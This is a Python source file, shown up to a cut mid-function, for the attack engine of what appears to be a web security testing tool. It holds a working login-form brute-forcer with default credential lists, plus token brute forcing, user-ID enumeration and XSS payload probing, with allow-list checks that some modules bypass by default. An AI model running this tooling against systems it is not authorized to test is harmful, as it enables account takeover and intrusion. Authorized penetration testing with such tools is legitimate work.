# xss_security_gui/attack_engine.py

import re
import time
import threading
import requests
from urllib.parse import urljoin, urlparse
import os
import json
import uuid
from collections import Counter
from typing import Any, Dict, Optional, List, Callable



from xss_security_gui.auto_modules.dom_and_endpoints import (
    attack_found_targets as auto_attack_found_targets,
    attack_dom_vectors as auto_attack_dom_vectors,
    build_headers_list,
    attack_api_endpoints,
    attack_parameters,
    attack_user_ids,
    attack_xss_targets,
)

from xss_security_gui.auto_modules.auto_modules import brute_force_tokens


import xss_security_gui.settings as settings

class AttackEngine:
    """AttackEngine 6.0 — единый движок атак для GUI и CLI."""

    def __init__(self, domain: str, threat_sender=None, log_func=None):
        self.domain = domain
        self.threat_sender = threat_sender or (lambda *a, **kw: None)
        self._init_logger(log_func)
        self._init_session()
        self.log_func = log_func or (lambda msg, level="info": print(f"[{level}] {msg}"))
        self.results: List[Dict[str, Any]] = []
        self.attack_id = str(uuid.uuid4())

        self.default_headers = {
            "User-Agent": "XSS-Security-GUI-AutoAttack/6.0",
            "Accept": "*/*",
        }

        self.header_profiles = [
            {},
            {"X-API-Key": "XSS-KEY"},
            {"Authorization": "Bearer XSS-Token"},
            {"Cookie": "session=XSSSESSION"},
            {"Cookie": "jwt=XSS-JWT"},
        ]

        # Официальный список модулей (используется GUI для прогресса)
        self.modules = [
            "API Endpoints",
            "Token Brute Force",
            "Parameters Discovery",
            "User IDs Enumeration",
            "XSS Targets",
            "GraphQL Endpoints",
            "JS Sensitive Analysis",
            "Security Headers Review",
            "CSP Weakness Scan",
            "Secrets & Keys",
            "JWT Tokens",
            "Forms & Inputs",
            "Error Pages & Stacktraces",
            "CSRF Actions",
            "SSRF Scan",
        ]

        # Обработчики модулей для модульной автоатаки
        self.module_handlers = {
            "API Endpoints": self._run_api_endpoints,
            "Token Brute Force": self._run_token_bruteforce,
            "Parameters Discovery": self._run_parameters,
            "User IDs Enumeration": self._run_user_ids,
            "XSS Targets": self._run_xss_targets,
            "GraphQL Endpoints": self._run_graphql,
            "JS Sensitive Analysis": self._run_js_sensitive,
            "Security Headers Review": self._run_security_headers,
            "CSP Weakness Scan": self._run_csp,
            "Secrets & Keys": self._run_secrets,
            "JWT Tokens": self._run_jwt,
            "Forms & Inputs": self._run_forms,
            "Error Pages & Stacktraces": self._run_errors,
            "CSRF Actions": self._run_csrf,
            "SSRF Scan": self._run_ssrf,
        }

    # ===================== API для GUI (модульные вызовы) =====================

    def _init_session(self) -> None:
        """Создаёт HTTP-сессию для всех сетевых модулей."""
        self._session = requests.Session()
        self._session.verify = False  # отключаем SSL warnings для тестовых целей
        self._session.headers.update(self.default_headers)

    def _init_logger(self, log_func=None) -> None:
        """Инициализирует лог-функцию для всех модулей."""
        self._log_func = log_func or (lambda msg, level="info": print(f"[{level}] {msg}"))

    def run_module(self, name: str, data: dict) -> dict:
        """
        Лёгкий API для GUI: запускает модуль в отдельном потоке и сразу возвращает короткий результат.
        """
        short_result = {"module": name, "status": "running", "items": []}
        threading.Thread(
            target=self._run_module_worker,
            args=(name, data),
            daemon=True,
        ).start()
        return short_result

    def _run_module_worker(self, name: str, data: dict) -> None:
        """Универсальный обработчик модулей, агрегирующий списки из data."""
        try:
            # Основная логика
            items = []
            for _, value in data.items():
                if isinstance(value, list):
                    items.extend(value)

            result = {
                "status": "done",
                "items": items,
                "count": len(items),
            }

            self._record_result(name, result)
            self._log(f"✔️ Модуль {name} завершён. Найдено {len(items)} элементов.", "info")

        except Exception as e:
            result = {
                "status": "error",
                "items": [],
                "count": 0,
                "error": str(e),
            }
            self._record_result(name, result)
            self._log(f"❌ Ошибка в модуле {name}: {type(e).__name__}: {e}", "error")

    def get_attack_results(self) -> List[Dict[str, Any]]:
        return self.results

    # ===================== Вспомогательные =====================
    def _check_allowed(self, ctx):
        base_url = ctx.get("base_url", "")
        return self._is_target_allowed(base_url)

    def _get_setting(self, path: str, default: Any = None) -> Any:
        """
        Достаёт значение из SETTINGS_JSON по пути вида 'http.request_timeout'.
        """
        node = settings.SETTINGS_JSON
        for part in path.split("."):
            if not isinstance(node, dict):
                return default
            node = node.get(part, default)
        return node if node is not None else default

    def _log(self, msg: str, level: str = "info") -> None:
        timestamp = time.strftime("%H:%M:%S")
        self.log_func(f"[{timestamp}] {msg}", level=level)

    def _record_result(self, attack_type: str, result: dict) -> None:
        normalized = {
            "attack_id": self.attack_id,
            "attack_type": attack_type,
            "domain": self.domain,
            "timestamp": time.time(),
            "severity": result.get("severity", "info"),
            **result,
        }
        self.results.append(normalized)
        try:
            self._send_intel(attack_type, normalized)
        except Exception as e:
            self._log(f"⚠️ Ошибка Threat Intel: {e}", level="error")

    # ELK і Splunk
    def _send_intel(self, event_type: str, data: dict):
        intel = settings.SETTINGS_JSON.get("threat_intel", {})

        if intel.get("elk_url"):
            requests.post(intel["elk_url"], json={"event_type": event_type, "data": data})

        if intel.get("splunk_url") and intel.get("splunk_token"):
            headers = {"Authorization": f"Splunk {intel['splunk_token']}"}
            payload = {"event": {"type": event_type, "data": data}}
            requests.post(intel["splunk_url"], headers=headers, json=payload)

    def _group_by_type(self) -> Dict[str, int]:
        return dict(Counter(r["attack_type"] for r in self.results))

    # ===================== Payload =====================

    def _normalize_url(self, url: str) -> str:
        url = url.strip()
        if not url:
            return url
        parsed = urlparse(url)
        if url.startswith("//") and not parsed.scheme:
            return "https:" + url
        if not parsed.scheme:
            return "https://" + url.lstrip("/")
        return url

    def _build_request_context(self, url: str, payload: str) -> dict:
        timeout = self._get_setting("http.request_timeout", 7)
        ua = self._get_setting("http.default_user_agent", "XSS-Security-GUI/6.5")

        ctx = {
            "method": "GET",
            "url": url,
            "params": {"x": payload},
            "data": None,
            "json": None,
            "headers": {
                "User-Agent": ua,
                "Accept": "*/*",
            },
            "cookies": {},
            "timeout": timeout,
            "verify": False,
        }
        if "{payload}" in url:
            ctx["url"] = url.replace("{payload}", payload)
            ctx["params"] = {}
        return ctx

    def _send_payload(self, url: str, payload: str, method: str = "GET"):
        try:
            url = self._normalize_url(url)

            if not self._is_target_allowed(url):
                self._log(f"🚫 Реальные запросы к {url} запрещены политикой ALLOW_REAL_RUN/ALLOWED_TARGETS",
                          level="warn")
                return None

            ctx = self._build_request_context(url, payload)
            method = method.upper()
            resp = requests.request(method, **ctx)
            return resp
        except Exception as e:
            self._log(f"❌ Ошибка _send_payload [{method}]: {e}", level="error")
            return None

    def _is_target_allowed(self, url: str) -> bool:
        """
        Проверяет, разрешён ли реальный запрос к цели.
        """
        if not settings.ALLOW_REAL_RUN:
            return False

        parsed = urlparse(url)
        host = parsed.hostname or ""
        # если домен явно указан при создании AttackEngine — тоже учитываем
        domain = (self.domain or "").lower()

        allowed = set(x.lower() for x in settings.ALLOWED_TARGETS)
        return host.lower() in allowed or domain in allowed

    def _make_request(self, method: str, endpoint: str, payload=None, headers=None):
        # базовый заголовок из настроек
        default_ua = self._get_setting("http.default_user_agent", "XSS-Security-GUI/6.5")
        headers = headers or {"Content-Type": "application/json", "User-Agent": default_ua}

        timeout = self._get_setting("http.request_timeout", 7)
        start = time.time()

        try:
            endpoint = self._normalize_url(endpoint)

            if not self._is_target_allowed(endpoint):
                self._log(f"🚫 Реальные запросы к {endpoint} запрещены политикой ALLOW_REAL_RUN/ALLOWED_TARGETS",
                          level="warn")
                return None, None

            method = method.upper()
            kwargs = {"headers": headers, "timeout": timeout}

            if method in ["POST", "PUT", "PATCH", "DELETE", "CONNECT"]:
                kwargs["json"] = {"input": payload}
            elif method in ["GET", "HEAD", "OPTIONS", "TRACE"]:
                kwargs["params"] = {"q": payload}

            r = requests.request(method, endpoint, **kwargs)
            elapsed = (time.time() - start) * 1000.0

            if hasattr(r, "text") and len(r.text) > 20000:
                r._text = r.text[:20000]

            return r, elapsed
        except Exception as e:
            self._log(f"❌ Ошибка _make_request [{method}] {endpoint}: {e}", level="error")
            return e, None

    def run_login_bruteforce(
        self,
        url: str,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        aggressive: bool = False,
        timeout: float = 8.0,
    ) -> Dict[str, Any]:
        """Realistic allowed-target brute-force for form-based login pages.

        Safety controls:
        - requires ALLOW_REAL_RUN and host to be in ALLOWED_TARGETS
        - intentionally small candidate pools in standard mode
        - aggressive mode expands only after explicit approval
        - returns structured findings without crashing GUI
        """
        target = self._normalize_url(url)
        if not self._is_target_allowed(target):
            return {
                "status": "skipped",
                "reason": "target-not-allowed",
                "target": target,
                "allowed_targets": list(getattr(settings, "ALLOWED_TARGETS", []) or []),
                "allow_real_run": bool(getattr(settings, "ALLOW_REAL_RUN", False)),
            }

        users = list(usernames or [
            "admin", "administrator", "root", "user", "support", "test", "manager", "demo"
        ])
        passwords = list(passwords or [
            "admin", "admin123", "password", "Password1", "welcome", "qwerty", "123456",
            "secret", "passw0rd", "guest", "root", "letmein", "manager", "test123", "demo123",
        ])

        if aggressive:
            users.extend(["billing", "portal", "ops", "service", "operator", "login"])
            passwords.extend(["Admin123", "Passw0rd!", "password123", "Welcome1", "Qwerty1", "manager123", "support123", "service123"])

        seen = set()
        ordered_users = []
        for user in users:
            key = str(user).strip().lower()
            if key and key not in seen:
                seen.add(key)
                ordered_users.append(str(user).strip())

        seen = set()
        ordered_passwords = []
        for pw in passwords:
            key = str(pw).strip().lower()
            if key and key not in seen:
                seen.add(key)
                ordered_passwords.append(str(pw).strip())

        try:
            response = requests.get(target, timeout=timeout, verify=False, headers={
                "User-Agent": self._get_setting("http.default_user_agent", "XSS-Security-GUI/6.5"),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            })
        except Exception as exc:
            return {"status": "error", "reason": f"page-fetch-failed: {type(exc).__name__}: {exc}", "target": target}

        html = response.text or ""
        if not html:
            return {"status": "skipped", "reason": "empty-page-response", "target": target}

        form_names = []
        for pattern in [
            r"name=[\"']([^\"']*(?:user|login|email|username|pass|passwd|password)[^\"']*)[\"']",
            r"id=[\"']([^\"']*(?:user|login|email|username|pass|passwd|password)[^\"']*)[\"']",
        ]:
            for match in re.findall(pattern, html, flags=re.IGNORECASE):
                form_names.append(match)

        if not form_names:
            return {"status": "skipped", "reason": "no-login-form-detected", "target": target}

        hits = []
        for username in ordered_users:
            for password in ordered_passwords:
                form_data = {}
                for field in form_names:
                    lname = str(field).lower()
                    if any(token in lname for token in ["user", "email", "login", "username", "account"]):
                        form_data[field] = username
                    elif any(token in lname for token in ["pass", "passwd", "password", "pwd"]):
                        form_data[field] = password
                    else:
                        form_data[field] = ""

                if not form_data:
                    continue

                action_url = target
                match = re.search(r"<form[^>]*action=[\"']([^\"']+)[\"'][^>]*>", html, flags=re.IGNORECASE | re.DOTALL)
                if match:
                    action = match.group(1).strip()
                    if action.startswith("http"):
                        action_url = action
                    else:
                        action_url = urljoin(target, action)

                try:
                    time.sleep(0.35)
                    resp = requests.post(
                        action_url,
                        data=form_data,
                        timeout=timeout,
                        verify=False,
                        headers={
                            "User-Agent": self._get_setting("http.default_user_agent", "XSS-Security-GUI/6.5"),
                            "Referer": target,
                            "X-Requested-With": "XMLHttpRequest",
                        },
                        allow_redirects=True,
                    )
                    body = (resp.text or "").lower()
                    success_markers = [
                        "welcome", "dashboard", "logout", "profile", "account", "success",
                        "session", "auth", "welcome back", "my account", "user home",
                    ]
                    if resp.status_code in (200, 201, 302, 303) and any(marker in body for marker in success_markers):
                        hit = {
                            "target": action_url,
                            "username": username,
                            "password": password,
                            "status_code": resp.status_code,
                            "risk": "critical",
                            "method": "form-bruteforce",
                            "success_markers": [marker for marker in success_markers if marker in body],
                            "response_excerpt": body[:300],
                        }
                        hits.append(hit)
                        return {
                            "status": "success",
                            "target": target,
                            "hits": hits,
                            "attempts": len(ordered_users) * len(ordered_passwords),
                            "aggressive": aggressive,
                        }
                except Exception as exc:
                    self._log(f"⚠️ Brute force attempt failed for {username}: {type(exc).__name__}: {exc}", level="warn")
                    continue

        return {
            "status": "done" if hits else "no-hit",
            "target": target,
            "hits": hits,
            "attempts": len(ordered_users) * len(ordered_passwords),
            "aggressive": aggressive,
            "reason": "no valid login pair found" if not hits else "credential confirmed",
        }

    def attack_payload(self, url: str, payload: str) -> dict:
        try:
            response = self._send_payload(url, payload)
            if response is None:
                return {
                    "status": "skipped",
                    "reflected": False,
                    "length": 0,
                    "response": "",
                }

            body = response.text if hasattr(response, "text") else str(response)
            reflected = payload in body
            return {
                "status": "ok",
                "reflected": reflected,
                "length": len(body),
                "response": body,
            }
        except Exception as e:
            self.log_func(f"❌ Ошибка attack_payload: {e}", "error")
            return {"status": "error", "reflected": False, "length": 0, "response": ""}

    def generate_tokens(self) -> List[str]:
        import secrets
        import base64

        static = [
            "test",
            "12345",
            "admin",
            "guest",
            "token",
            "secret",
            "apikey",
            "jwt",
            "bearer",
            "access",
            "session",
        ]
        random_tokens = [
            secrets.token_hex(8),
            secrets.token_hex(16),
            base64.b64encode(secrets.token_bytes(12)).decode("utf-8"),
        ]
        jwt_like = [f"{secrets.token_hex(4)}.{secrets.token_hex(8)}.{secrets.token_hex(4)}"]
        return static + random_tokens + jwt_like

    # ===================== Автоатаки (модульная) =====================

    def run_modular_auto_attack(self, crawl_json: dict) -> None:
        threading.Thread(
            target=self._run_modular_auto_attack_worker,
            args=(crawl_json,),
            daemon=True,
        ).start()

    def _load_session_cookies(self, session_file: str = "session.json") -> requests.Session:
        """
        Загружает cookies из session.json и возвращает готовый requests.Session().
        """
        s = requests.Session()
        try:
            with open(session_file, encoding="utf-8") as f:
                cookies = json.load(f)
            for c in cookies:
                s.cookies.set(
                    name=c["name"],
                    value=c["value"],
                    domain=c.get("domain"),
                    path=c.get("path", "/"),
                    secure=c.get("secure", False),
                    rest={"HttpOnly": c.get("httpOnly", False)},
                )
            self._log(f"🍪 Загружено {len(cookies)} cookies из {session_file}")
        except Exception as e:
            self._log(f"⚠️ Ошибка загрузки cookies: {e}", level="warn")
        return s

    def _run_modular_auto_attack_worker(self, crawl_json: dict) -> None:
        self._log("🧪 Modular AutoAttack 6.2 запущен...")

        try:
            # Базовый URL
            visited = crawl_json.get("visited") or [self.domain]
            base_url = visited[0]

            # Загружаем заголовки и токены
            headers_list = build_headers_list(crawl_json.get("tokens", []))
            token_candidates = self.generate_tokens()

            # Загружаем cookies из session.json
            session = self._load_session_cookies("session.json")

            # Контекст для всех модулей
            context = {
                "session": session,
                "base_url": base_url,
                "headers_list": headers_list,
                "crawl": crawl_json,
                "tokens": token_candidates,
                "settings": settings,
                "domain": self.domain,
                "secrets": {"tokens": token_candidates},

            }
            self._last_context = context  # ← сохранение единого еталонного контекста

            # Запуск модулей
            for module_name in self.modules:
                handler = self.module_handlers.get(module_name)

                if not handler:
                    self._log(f"⚠️ Нет обработчика для модуля: {module_name}", "warn")
                    continue

                try:
                    self._log(f"▶️ {module_name}...")

                    result = handler(context)

                    # Нормализация результата
                    if not isinstance(result, dict):
                        result = {"status": "done", "items": [], "count": 0}

                    result.setdefault("status", "done")
                    result.setdefault("items", [])
                    result.setdefault("count", len(result["items"]))

                    self._record_result(module_name, result)

                except Exception as e:
                    error_result = {
                        "status": "error",
                        "error": str(e),
                        "severity": "error",
                        "items": [],
                        "count": 0,
                    }
                    self._record_result(module_name, error_result)
                    self._log(f"❌ Ошибка в модуле {module_name}: {e}", level="error")

            self._log("✅ Modular AutoAttack завершён.")

        except Exception as e:
            fatal = {
                "target": self.domain,
                "error": str(e),
                "severity": "error",
            }
            self._record_result("auto_attack", fatal)
            self._log(f"❌ Modular AutoAttack ошибка: {type(e).__name__}: {e}", level="error")


    # ===================== Реализация модулей =====================

    def _run_api_endpoints(self, ctx):
        base_url = ctx["base_url"]

        # Safety check
        if not self._is_target_allowed(base_url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        api_endpoints = ctx["crawl"].get("api_endpoints", [])
        if not api_endpoints:
            return {"status": "skipped", "reason": "no-api-endpoints"}

        # Execute module
        results = attack_api_endpoints(
            ctx["session"],
            base_url,
            api_endpoints,
            ctx["headers_list"],
            self._log,
        ) or []

        enhanced_items = []

        for item in results:
            url = item.get("url", "")
            status_code = item.get("status_code", 0)
            body_excerpt = item.get("body", "")[:200]
            content_type = item.get("content_type", "")

            # --- Improvements added ---
            risk_score = (
                    (3 if status_code >= 500 else 0) +
                    (2 if status_code >= 400 else 0) +
                    (1 if "json" in content_type.lower() else 0)
            )

            context_score = (
                    (2 if "/api/" in url.lower() else 0) +
                    (1 if "v1" in url.lower() or "v2" in url.lower() else 0)
            )

            pattern_score = len(url) // 20
            total_score = risk_score + context_score + pattern_score

            fingerprint = hash((url + content_type + body_excerpt)[:300])

            enhanced_items.append({
                "url": url,
                "status_code": status_code,
                "content_type": content_type,
                "body_excerpt": body_excerpt,
                "risk_score": risk_score,
                "context_score": context_score,
                "pattern_score": pattern_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_token_bruteforce(self, ctx):
        domain = ctx["domain"]
        url = f"https://{domain}"

        # Safety check
        if not self._is_target_allowed(url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        tokens = ctx["secrets"].get("tokens", [])
        if not tokens:
            return {"status": "skipped", "reason": "no-tokens"}

        # Execute brute force module
        raw_results = brute_force_tokens(
            session=self._session,
            base_url=url,
            tokens=tokens,
            log=self._log_func,
        ) or []

        enhanced_items = []

        for item in raw_results:
            token = item.get("token", "")
            status_code = item.get("status_code", 0)
            content_type = item.get("content_type", "")
            body_excerpt = item.get("body_excerpt", "")[:200]

            # --- Improvements added ---

            # Token entropy score (strong indicator of randomness)
            entropy_score = len(set(token))  # unique chars count

            # Token length score
            length_score = len(token) // 5

            # Token pattern score (detects structured tokens)
            pattern_score = (
                2 if "-" in token else 0 +
                                       2 if "." in token else 0 +
                                                              1 if token.isalnum() else 0
            )

            # Risk score based on API response
            risk_score = (
                    (3 if status_code == 200 else 0) +
                    (2 if status_code >= 400 else 0) +
                    (1 if "json" in content_type.lower() else 0)
            )

            # Context score based on endpoint structure
            context_score = (
                    (2 if "/api/" in item.get("url", "").lower() else 0) +
                    (1 if "v1" in item.get("url", "").lower() or "v2" in item.get("url", "").lower() else 0)
            )

            # Total score
            total_score = (
                    entropy_score +
                    length_score +
                    pattern_score +
                    risk_score +
                    context_score
            )

            # Fingerprint for correlation & heatmap
            fingerprint = hash((token + str(status_code) + content_type + body_excerpt)[:300])

            enhanced_items.append({
                "token": token,
                "status_code": status_code,
                "content_type": content_type,
                "body_excerpt": body_excerpt,

                # Added improvements
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        # Severity classification
        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_parameters(self, ctx):
        base_url = ctx["base_url"]

        # Safety check
        if not self._is_target_allowed(base_url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        parameters = ctx["crawl"].get("parameters", [])
        if not parameters:
            return {"status": "skipped", "reason": "no-parameters"}

        # Execute module
        raw_results = attack_parameters(
            ctx["session"],
            base_url,
            parameters,
            self._log,
        ) or []

        enhanced_items = []

        for item in raw_results:
            param = item.get("parameter", "")
            url = item.get("url", "")
            status_code = item.get("status_code", 0)
            content_type = item.get("content_type", "")
            body_excerpt = item.get("body_excerpt", "")[:200]

            # --- Improvements added ---

            # Entropy score: how random the parameter value is
            value = param.split("=", 1)[-1]
            entropy_score = len(set(value))

            # Length score: longer parameters often more sensitive
            length_score = len(value) // 5

            # Pattern score: detect structured parameters
            pattern_score = (
                    (2 if "-" in value else 0) +
                    (2 if "." in value else 0) +
                    (1 if value.isalnum() else 0)
            )

            # Risk score based on API response
            risk_score = (
                    (3 if status_code == 200 else 0) +
                    (2 if status_code >= 400 else 0) +
                    (1 if "json" in content_type.lower() else 0)
            )

            # Context score based on endpoint structure
            context_score = (
                    (2 if "/api/" in url.lower() else 0) +
                    (1 if "v1" in url.lower() or "v2" in url.lower() else 0)
            )

            # Total score
            total_score = (
                    entropy_score +
                    length_score +
                    pattern_score +
                    risk_score +
                    context_score
            )

            # Fingerprint for correlation & heatmap
            fingerprint = hash((param + url + str(status_code) + content_type + body_excerpt)[:300])

            enhanced_items.append({
                "parameter": param,
                "url": url,
                "status_code": status_code,
                "content_type": content_type,
                "body_excerpt": body_excerpt,

                # Added improvements
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        # Severity classification
        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_user_ids(self, ctx: Dict[str, Any]) -> dict:
        allow_real = ctx.get("settings", {}).get("allow_real_run", True)
        if not allow_real:
            return {"status": "skipped", "reason": "real-run-not-allowed"}

        crawl = ctx["crawl"]
        user_ids = crawl.get("user_ids", [])
        if not user_ids:
            return {"status": "skipped", "items": [], "count": 0, "reason": "no user_ids"}

        raw_results = attack_user_ids(
            ctx["session"],
            ctx["base_url"],
            user_ids,
            self._log,
        ) or []

        enhanced_items = []

        for item in raw_results:
            user_id = item.get("user_id", "")
            url = item.get("url", "")
            status_code = item.get("status_code", 0)
            content_type = item.get("content_type", "")
            body_excerpt = item.get("body_excerpt", "")[:200]

            # --- Improvements added ---

            # Entropy score: randomness of user_id
            entropy_score = len(set(str(user_id)))

            # Length score: longer IDs often more sensitive
            length_score = len(str(user_id)) // 3

            # Pattern score: detect structured IDs
            pattern_score = (
                    (2 if "-" in str(user_id) else 0) +
                    (2 if "." in str(user_id) else 0) +
                    (1 if str(user_id).isdigit() else 0)
            )

            # Risk score based on API response
            risk_score = (
                    (3 if status_code == 200 else 0) +
                    (2 if status_code >= 400 else 0) +
                    (1 if "json" in content_type.lower() else 0)
            )

            # Context score based on endpoint structure
            context_score = (
                    (2 if "/api/" in url.lower() else 0) +
                    (1 if "v1" in url.lower() or "v2" in url.lower() else 0)
            )

            # Total score
            total_score = (
                    entropy_score +
                    length_score +
                    pattern_score +
                    risk_score +
                    context_score
            )

            # Fingerprint for correlation & heatmap
            fingerprint = hash((str(user_id) + url + str(status_code) + content_type + body_excerpt)[:300])

            enhanced_items.append({
                "user_id": user_id,
                "url": url,
                "status_code": status_code,
                "content_type": content_type,
                "body_excerpt": body_excerpt,

                # Added improvements
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        # Severity classification
        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_xss_targets(self, ctx: Dict[str, Any]) -> dict:
        allow_real = ctx.get("settings", {}).get("allow_real_run", True)
        if not allow_real:
            return {"status": "skipped", "reason": "real-run-not-allowed"}

        crawl = ctx["crawl"]
        xss_targets = crawl.get("xss_targets", [])
        if not xss_targets:
            return {"status": "skipped", "items": [], "count": 0, "reason": "no xss_targets"}

        raw_results = attack_xss_targets(
            ctx["session"],
            ctx["base_url"],
            xss_targets,
            self._log,
        ) or []

        enhanced_items = []

        for item in raw_results:
            url = item.get("url", "")
            payload = item.get("payload", "")
            reflected = item.get("reflected", False)
            context_type = item.get("context_type", "")
            snippet = item.get("context_snippet", "")[:200]
            status_code = item.get("status_code", 0)

            # --- Improvements added ---

            # Entropy score: randomness of payload
            entropy_score = len(set(payload))

            # Length score: longer payloads often more dangerous
            length_score = len(payload) // 5

            # Pattern score: detect structured XSS payloads
            pattern_score = (
                    (3 if "<script" in payload.lower() else 0) +
                    (2 if "onerror" in payload.lower() else 0) +
                    (2 if "svg" in payload.lower() else 0) +
                    (1 if "iframe" in payload.lower() else 0)
            )

            # Risk score based on reflection and context
            risk_score = (
                    (3 if reflected else 0) +
                    (2 if context_type in ("JS Context", "Attribute Injection") else 0) +
                    (1 if status_code >= 400 else 0)
            )

            # Context score based on endpoint structure
            context_score = (
                    (2 if "/api/" not in url.lower() else 0) +  # API endpoints rarely reflect HTML
                    (1 if any(x in url.lower() for x in ["view", "page", "html"]) else 0)
            )

            # Total score
            total_score = (
                    entropy_score +
                    length_score +
                    pattern_score +
                    risk_score +
                    context_score
            )

            # Fingerprint for correlation & heatmap
            fingerprint = hash((url + payload + context_type + snippet)[:300])

            enhanced_items.append({
                "url": url,
                "payload": payload,
                "reflected": reflected,
                "context_type": context_type,
                "context_snippet": snippet,
                "status_code": status_code,

                # Added improvements
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        # Severity classification
        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_graphql(self, ctx: Dict[str, Any]) -> dict:
        crawl = ctx["crawl"]
        graphql = crawl.get("graphql", [])
        if not graphql:
            return {
                "status": "skipped",
                "items": [],
                "count": 0,
                "severity": "low",
                "reason": "no graphql endpoints",
            }

        enhanced_items = []

        for ep in graphql:
            endpoint = ep or ""
            endpoint_lower = endpoint.lower()

            # --- Improvements added ---

            # Entropy score: randomness of endpoint path
            entropy_score = len(set(endpoint))

            # Length score: longer endpoints often more complex
            length_score = len(endpoint) // 5

            # Pattern score: detect GraphQL-specific structures
            pattern_score = (
                    (3 if "graphql" in endpoint_lower else 0) +
                    (2 if "/api/" in endpoint_lower else 0) +
                    (1 if "query" in endpoint_lower or "mutation" in endpoint_lower else 0)
            )

            # Risk score: based on typical GraphQL exposure risks
            risk_score = (
                    (3 if endpoint_lower.endswith("/graphql") else 0) +
                    (2 if "playground" in endpoint_lower else 0) +
                    (1 if "schema" in endpoint_lower else 0)
            )

            # Context score: endpoint structure
            context_score = (
                    (2 if endpoint_lower.startswith("https://") else 0) +
                    (1 if endpoint_lower.startswith("http://") else 0)
            )

            # Total score
            total_score = (
                    entropy_score +
                    length_score +
                    pattern_score +
                    risk_score +
                    context_score
            )

            # Fingerprint for correlation & heatmap
            fingerprint = hash((endpoint + str(total_score))[:300])

            enhanced_items.append({
                "endpoint": endpoint,

                # Added improvements
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

        # Severity classification
        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
            "items": enhanced_items,
            "count": len(enhanced_items),
            "severity": severity,
        }

    def _run_js_sensitive(self, ctx: Dict[str, Any]) -> dict:
        base_url = ctx.get("base_url", "")
        if not self._is_target_allowed(base_url):
            return {"status": "skipped", "reason": "target-not-allowed"}

        scripts = ctx["crawl"].get("scripts", [])
        if not scripts:
            return {"status": "skipped", "reason": "no-scripts"}

        findings: List[Dict[str, Any]] = []

        # JS Endpoint Attacks
        self._log("🔷 JS Endpoint Attacks...")
        try:
            auto_attack_found_targets(self, scripts)
        except Exception as e:
            self._log(f"❌ Ошибка JS Endpoint Attacks: {e}", level="error")

        # DOM Vector Attacks
        self._log("🔷 DOM Vector Attacks...")
        try:
            auto_attack_dom_vectors(self, scripts)
        except Exception as e:
            self._log(f"❌ Ошибка DOM Vector Attacks: {e}", level="error")

        # Collect results
        for r in self.results:
            if r.get("attack_type") in ("found_targets", "dom_vectors"):
                findings.append(r)

        enhanced_items = []

        for item in findings:
            payload = item.get("payload", "")
            context = item.get("context_type", "")
            reflected = item.get("reflected", False)
            snippet = item.get("response_excerpt", "")[:200]

            # --- Improvements added ---
            entropy_score = len(set(payload))
            length_score = len(payload) // 5
            pattern_score = (
                    (3 if "<script" in payload.lower() else 0) +
                    (2 if "onerror" in payload.lower() else 0) +
                    (2 if "svg" in payload.lower() else 0)
            )
            risk_score = (
                    (3 if reflected else 0) +
                    (2 if context in ("JS Context", "Attribute Injection") else 0)
            )
            context_score = (
                    (2 if "js" in context.lower() else 0) +
                    (1 if "dom" in context.lower() else 0)
            )

            total_score = entropy_score + length_score + pattern_score + risk_score + context_score
            fingerprint = hash((payload + context + snippet)[:300])

            item.update({
                "entropy_score": entropy_score,
                "length_score": length_score,
                "pattern_score": pattern_score,
                "risk_score": risk_score,
                "context_score": context_score,
                "total_score": total_score,
                "fingerprint": fingerprint,
            })

            enhanced_items.append(item)

        severity = (
            "critical" if any(i["risk_score"] >= 3 for i in enhanced_items) else
            "high" if any(i["risk_score"] >= 2 for i in enhanced_items) else
            "medium" if enhanced_items else
            "low"
        )

        return {
            "status": "done",
